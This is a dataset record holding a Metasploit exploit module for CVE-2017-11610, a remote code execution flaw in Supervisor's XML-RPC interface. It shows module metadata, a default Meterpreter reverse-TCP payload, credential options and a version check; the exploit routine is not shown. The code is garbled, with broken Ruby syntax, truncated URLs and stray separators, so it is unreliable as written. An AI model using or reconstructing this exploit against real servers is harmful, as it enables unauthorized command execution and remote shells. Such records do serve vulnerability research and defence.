{
    "text": "vul_name : Supervisor XML-RPC Authenticated Remote Code Execution ， vul_cve : CVE-2017-11610 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， super ( update_info ( info ,  ， 'Name' => \"Supervisor XML-RPC Authenticated Remote Code Execution\" ,  ， 'Description' => %q{ ， This module exploits a vulnerability in the Supervisor process control software , where an authenticated client ， can send a malicious XML-RPC request to supervisord that will run arbitrary shell commands on the server. ， The commands will be run as the same user as supervisord. Depending on how supervisord has been configured , this ， may be root. This vulnerability can only be exploited by an authenticated client , or if supervisord has been ， configured to run an HTTP server without authentication. This vulnerability affects versions 3.0a1 to 3.3.2. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Calum Hutton <c.e.hutton @ gmx.com>' ，  ]  ,  ， ' ，  [  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'CVE' , '2017-11610' ]  ，  ]  ,  ， 'Platform' => 'linux' ,  ， 'Targets' => ，  [  ，  [ '3.0a1-3.3.2' , {} ]  ，  ]  ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'DefaultOptions' => ， { ， 'RPORT' => 9001 ,  ， 'Payload' => 'linux/x64/meterpreter/reverse_tcp' ,  ， } ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => 'Jul 19 2017' ,  ， 'DefaultTarget' => 0 ， register_options (  ，  [  ， Opt : RPORT ( 9001 )  ,  ， OptString.new ( 'HttpUsername' ,  [ false , 'Username for HTTP basic auth' ]  )  ,  ， OptString.new ( 'HttpPassword' ,  [ false , 'Password for HTTP basic auth' ]  )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'The path to the XML-RPC endpoint' , '/RPC2' ]  )  ,  ，  ]  ， end ， end ， end ， def check ， print_status ( 'Extracting version from web interface.' )  ， params = { ， 'method' => 'GET' ,  ， 'uri' => normalize_uri ( '/' )  ， } ， print_status ( \"Using basic auth (  # {datastore [ 'HttpUsername' ] } :  # {datastore [ 'HttpPassword' ] } ) \" )  ， params.merge !  ( {'authorization' => basic_auth ( datastore [ 'HttpUsername' ]  , datastore [ 'HttpPassword' ]  ) } )  ， end ， res = send_request_cgi ( params )  ， match = res.body.match ( /<span> ( \\d+\\. [ \\dab ] \\.\\d+ ) <\\/span>/ )  ， version = Gem : Version.new ( match [ 1 ]  )  ， print_good ( \"Vulnerable version found :  # {version}\" ) ",
    "time": "2017.09.25"
}